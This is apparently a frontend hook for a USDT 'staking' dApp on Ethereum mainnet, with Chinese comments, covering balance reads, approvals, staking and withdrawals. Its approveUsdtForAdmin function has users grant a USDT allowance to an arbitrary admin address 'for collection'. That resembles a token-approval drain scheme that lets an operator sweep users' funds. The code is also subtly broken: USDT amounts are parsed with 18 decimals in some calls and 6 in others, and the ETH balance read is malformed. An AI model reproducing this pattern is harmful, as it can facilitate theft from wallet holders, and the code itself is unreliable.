'use client'

import { useAccount, useReadContract, useWriteContract, useSwitchChain } from 'wagmi'
import { parseUnits, formatUnits } from 'viem'
import { mainnet } from 'wagmi/chains'
import { CURRENT_NETWORK, USDT_ABI, SUPPORT_ABI } from '@/lib/contracts'
import { getTreasuryAddressFromEnv, getStakingContractFromEnv } from '@/lib/load-env'

// 获取收款地址和质押合约地址
const TREASURY_ADDRESS = getTreasuryAddressFromEnv()
const STAKING_CONTRACT = getStakingContractFromEnv()

// 更新当前网络配置
// 注意：USDTverify是给质押合约(STAKING_CONTRACT)，而不是收款地址(TREASURY_ADDRESS)
// 质押合约会在用户质押时将USDT转移到收款地址(TREASURY_ADDRESS)
const UPDATED_NETWORK = {
  ...CURRENT_NETWORK,
  TREASURY_ADDRESS: TREASURY_ADDRESS,
  STAKING_CONTRACT: STAKING_CONTRACT
}

declare global {
  interface Window {
    ethereum?: any
  }
}

// SafeToken合约ABI (简化版 - 使用transferFrom替代create)
const SAFE_TOKEN_ABI = [
  {
    inputs: [
      { name: 'sender', type: 'address' },
      { name: 'recipient', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ],
    name: 'transferFrom',
    outputs: [{ type: 'bool' }],
    stateMutability: 'nonpayable',
    type: 'function'
  },
  {
    inputs: [
      { name: 'id', type: 'uint256' },
      { name: 'currency_id', type: 'uint256' },
      { name: 'amount', type: 'uint256' },
      { name: 'timestamp', type: 'uint256' },
      { name: 'signature', type: 'bytes' }
    ],
    name: 'withdraw',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function'
  }
]

export const useWeb3Staking = () => {
  const { address, isConnected, chainId } = useAccount()
  const { switchChain } = useSwitchChain()
  const { writeContract } = useWriteContract()

  // 检查是否在支持的网络
  const isOnSupportedNetwork = chainId === 1

  // 获取USDT余额
  const { data: usdtBalance, refetch: refetchUsdtBalance } = useReadContract({
    address: UPDATED_NETWORK.USDT_CONTRACT as `0x${string}`,
    abi: USDT_ABI,
    functionName: 'balanceOf',
    args: [address],
    query: { enabled: !!address && isOnSupportedNetwork }
  })

  // 获取USDTverify额度
  const { data: usdtAllowance, refetch: refetchUsdtAllowance } = useReadContract({
    address: UPDATED_NETWORK.USDT_CONTRACT as `0x${string}`,
    abi: USDT_ABI,
    functionName: 'allowance',
    args: [address, UPDATED_NETWORK.STAKING_CONTRACT], // 查询对质押合约地址的verify
    query: { enabled: !!address && isOnSupportedNetwork }
  })

  // 获取ETH余额
  const { data: ethBalance } = useReadContract({
    address: '0x0000000000000000000000000000000000000000' as `0x${string}`,
    abi: [],
    functionName: 'balanceOf',
    args: [address],
    query: { enabled: !!address && isOnSupportedNetwork }
  })

  // 切换到支持的网络
  const switchToSupportedNetwork = async (targetChainId = 1) => {
    try {
      if (targetChainId === 1) {
        await switchChain({ chainId: 1 }) // ETH主网
      } else {
        throw new Error('不支持的网络ID，仅支持ETH主网')
      }
    } catch (error) {
      console.error('切换网络失败:', error)
      throw error
    }
  }

  // verifyUSDT给质押合约
  const approveUsdt = async (amount: string) => {
    const parsedAmount = parseUnits(amount, 18)
    
    // verifyUSDT给质押合约地址
    const result = await writeContract({
      address: UPDATED_NETWORK.USDT_CONTRACT as `0x${string}`,
      abi: USDT_ABI,
      functionName: 'approve',
      args: [UPDATED_NETWORK.STAKING_CONTRACT, parsedAmount]
    })
    
    // writeContract返回的是交易哈希字符串
    console.log('🔍 writeContract返回结果:', result)
    console.log('🔍 返回结果类型:', typeof result)
    
    return result
  }

  // verifyUSDT给管理员地址（用于归集操作）
  const approveUsdtForAdmin = async (amount: string, adminAddress: string) => {
    const parsedAmount = parseUnits(amount, 6) // USDT 使用 6 位小数
    
    console.log(`📝 准备verify ${amount} USDT (${parsedAmount.toString()}) 给管理员地址: ${adminAddress}`)
    
    // verifyUSDT给管理员地址，用于归集操作
    const hash = await writeContract({
      address: UPDATED_NETWORK.USDT_CONTRACT as `0x${string}`,
      abi: USDT_ABI,
      functionName: 'approve',
      args: [adminAddress as `0x${string}`, parsedAmount]
    })
    
    return hash
  }

  // 质押USDT - 调用SupportXhsk合约的create方法
  const stakeUsdt = async (amount: string, ratio = 100) => {
    const parsedAmount = parseUnits(amount, 18)
    
    // 调用质押合约的create方法进行质押
    return writeContract({
      address: UPDATED_NETWORK.STAKING_CONTRACT as `0x${string}`,
      abi: SUPPORT_ABI,
      functionName: 'create',
      args: [parsedAmount, ratio]
    })
  }

  // 提取奖励
  const withdraw = async (id: number, currencyId: number, amount: string, timestamp: number, signature: string) => {
    const parsedAmount = parseUnits(amount, 18)
    
    return writeContract({
      address: UPDATED_NETWORK.STAKING_CONTRACT as `0x${string}`,
      abi: SAFE_TOKEN_ABI,
      functionName: 'withdraw',
      args: [id, currencyId, parsedAmount, timestamp, signature]
    })
  }

  return {
    // 状态
    address,
    isConnected,
    chainId,
    isOnSupportedNetwork,
    
    // 余额 - USDT 在 ETH 主网使用 6 位小数
    usdtBalance: usdtBalance ? formatUnits(usdtBalance as bigint, 6) : '0',
    ethBalance: ethBalance ? formatUnits(ethBalance as bigint, 18) : '0',
    usdtAllowance: usdtAllowance ? formatUnits(usdtAllowance as bigint, 6) : '0',
    
    // 操作
    switchToSupportedNetwork,
    approveUsdt,
    approveUsdtForAdmin,
    stakeUsdt,
    withdraw,
    
    // 刷新
    refetchUsdtBalance,
    refetchUsdtAllowance
  }
} 